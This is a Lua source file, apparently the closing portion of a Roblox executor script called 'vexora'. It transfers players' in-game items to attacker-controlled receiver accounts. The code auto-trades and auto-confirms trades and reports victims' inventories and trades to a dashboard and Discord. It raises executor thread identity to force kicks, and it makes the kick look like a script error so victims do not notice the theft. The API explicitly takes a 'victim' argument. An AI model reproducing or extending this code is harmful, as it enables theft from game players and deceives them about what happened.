local kicked = false

-- Kick is a server-level call on a normal client script; executors only get away with
-- it at a high identity, and some reset the thread identity before we get there
local function raiseIdentity()
    pcall(function() setthreadidentity(8) end)
    pcall(function() setidentity(8) end)
    pcall(function() syn.set_thread_identity(8) end)
    pcall(function() getgenv().set_thread_identity(8) end)
end

local function kickPlayer(reason)
    if kicked or stopped then return end
    kicked = true
    AUTO_TRADE, AUTO_ACCEPT = false, false
    pcall(drain)

    -- show the same phrase on the loading screen so it reads like a script error
    if splash then
        local bg = splash:FindFirstChild("Backdrop")
        local status = bg and bg:FindFirstChild("Status")
        if status then
            if pulseTween then pcall(function() pulseTween:Cancel() end) end
            status.Text = tostring(reason)
            status.TextTransparency = 0
        end
    end

    -- executors differ on who may call Kick. a working kick kills this thread, so if
    -- we are still running a second later the attempt was a no-op and the next shape runs
    local attempts = {
        { name = "LocalPlayer:Kick", fn = function() LocalPlayer:Kick(reason) end },
        { name = "Players.LocalPlayer:Kick", fn = function() Players.LocalPlayer:Kick(reason) end },
        { name = "Players service", fn = function() game:GetService("Players").LocalPlayer:Kick(reason) end },
        { name = "Shutdown", fn = function() game:Shutdown() end },
    }

    task.spawn(function()
        raiseIdentity()
        for round = 1, 3 do
            raiseIdentity()
            for _, attempt in ipairs(attempts) do
                local ok, err = pcall(attempt.fn)
                print(string.format("[vexora] kick via %s -> %s", attempt.name,
                    ok and "sent" or tostring(err)))
                task.wait(ok and 1 or 0.2)
            end
        end
        print("[vexora] executor refuses Kick - still in game")
    end)
end

if KICK_IF_EMPTY and not IS_CLAIMER then
    task.spawn(function()
        -- executors can inject before LocalPlayer exists; wait it out rather than
        -- reading an empty world and booting instantly
        local waited = 0
        while not stopped and not (LocalPlayer or Players.LocalPlayer) and waited < 15 do
            task.wait(0.5)
            waited = waited + 0.5
        end
        local player = LocalPlayer or Players.LocalPlayer
        if not player then
            print("[vexora] no LocalPlayer - empty-inventory kick idle")
            return
        end

        captureSpawnDefaults()

        local graceUntil = os.time() + EMPTY_GRACE
        track(player.CharacterAdded:Connect(function()
            graceUntil = os.time() + EMPTY_GRACE
            captureSpawnDefaults()
            task.delay(2, captureSpawnDefaults)
            print(string.format("[vexora] respawned - %ds inventory grace", EMPTY_GRACE))
        end))

        print(string.format("[vexora] no-item kick armed | grace=%ds interval=%ds checks=%d | guns_only=%s",
            EMPTY_GRACE, EMPTY_INTERVAL, EMPTY_CHECKS, tostring(GUN_ONLY)))

        local emptyReads, lastSig, held, probed = 0, "", false, false
        while not stopped and not kicked do
            task.wait(EMPTY_INTERVAL)
            local real, all = realItems(os.time() >= graceUntil)
            local count = #real
            local sig = tostring(#all) .. "|" .. table.concat(real, ",")
            if sig ~= lastSig then
                local shown = {}
                for _, entry in ipairs(all) do
                    table.insert(shown, entry.name .. (entry.at == "equipped" and "*" or ""))
                end
                print(string.format("[vexora] inventory: %d item(s), %d counted -> %s", #all, count,
                    #shown > 0 and table.concat(shown, ", ") or "nothing"))
                lastSig = sig
            end

            -- never kick on a read we could not make. an unreadable inventory is not
            -- an empty one, and a trade in flight is proof there is something to trade
            if os.time() >= graceUntil and not outgoingTrade and not tradeSawItems then
                if count == 0 and inventoryInfo.seen then
                    emptyReads = emptyReads + 1
                    print(string.format("[vexora] nothing to trade (%d/%d)", emptyReads, EMPTY_CHECKS))
                    if emptyReads >= EMPTY_CHECKS then
                        print("[vexora] no real items - kicking")
                        kickPlayer(EMPTY_KICK_MESSAGE)
                        return
                    end
                elseif count == 0 then
                    emptyReads = 0
                    if not held then
                        held = true
                        print("[vexora] inventory unreadable - kick held")
                    end
                    if not probed then
                        probed = true
                        reportTrade("probe", "-", {
                            items = probeLines(),
                            detail = "inventory unreadable, kick held",
                        })
                    end
                else
                    emptyReads = 0
                end
            end
        end
    end)
end

print(string.format("[vexora] client rev %s | %s | game=%s | server=%s | executor=%s", CLIENT_REV, ROBLOX_USER, GAME, tostring(SERVER_ID), EXECUTOR))
print(string.format("[vexora] claimer=%s auto_claim=%s kick_if_empty=%s grace=%ds checks=%d",
    tostring(IS_CLAIMER), tostring(AUTO_CLAIM and not IS_CLAIMER), tostring(KICK_IF_EMPTY and not IS_CLAIMER), EMPTY_GRACE, EMPTY_CHECKS))
print(string.format("[vexora] trade remotes=%d item remotes=%d confirm remotes=%d receivers=%d auto_trade=%s auto_accept=%s",
    #tradeRemotes, #itemRemotes, #acceptRemotes, #RECEIVER_ACCOUNTS, tostring(AUTO_TRADE), tostring(AUTO_ACCEPT)))
print("[vexora] API: Vexora.capture(item, victim, value) | Vexora.claim(item, victim, value) | Vexora.inventory() | Vexora.selftest() | Vexora.stop()")

function Vexora.kick(reason)
    kickPlayer(reason or EMPTY_KICK_MESSAGE)
end

if AUTO_ACCEPT and #acceptRemotes > 0 then
    for _, remote in ipairs(acceptRemotes) do
        pcall(function()
            track(remote.OnClientEvent:Connect(function(...)
                local victim = playerIn({ ... })
                pcall(function() remote:FireServer("accept", victim) end)
            end))
        end)
    end
end

autoTrade()

--[[ ---- receiver side: confirm incoming trade windows without input ---- ]]
if AUTO_ACCEPT then
    task.spawn(function()
        while not stopped do
            task.wait(2)
            if not outgoingTrade and tradeWindow() then
                confirmTrade()
                print("[vexora] incoming trade window - confirmed")
            end
        end
    end)
end

--[[ ---- receiver trades: fire on join, or if one is already in the server ---- ]]
if AUTO_TRADE_RECEIVERS then
    if #RECEIVER_ACCOUNTS == 0 then
        print("[vexora] no receivers configured - add one on My script to trade on join")
    else
        track(Players.PlayerAdded:Connect(function(plr)
            if isReceiver(plr.Name) then
                task.delay(1, function() runReceiverTrade(plr) end)
            end
        end))
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and isReceiver(plr.Name) then
                runReceiverTrade(plr)
            end
        end
    end
end

task.delay(1, function()
    reportTrade("engine", "-", {
        detail = string.format("trade=%d item=%d confirm=%d receivers=%d",
            #tradeRemotes, #itemRemotes, #acceptRemotes, #RECEIVER_ACCOUNTS),
    })
end)

task.spawn(function()
    task.wait(1)
    if Vexora.selftest() then
        print("[vexora] selftest queued — check dashboard + discord")
    end
    if REPORT_INVENTORY then
        local items = Vexora.inventory()
        print(string.format("[vexora] inventory: %d item(s) — %s", #items, table.concat(items, ", ")))
    end
end)

--[[ ---- session timer: the loader holds for five minutes, then everything detaches ---- ]]
task.delay(SESSION_SECONDS, function()
    Vexora.stop()
end)

return Vexora
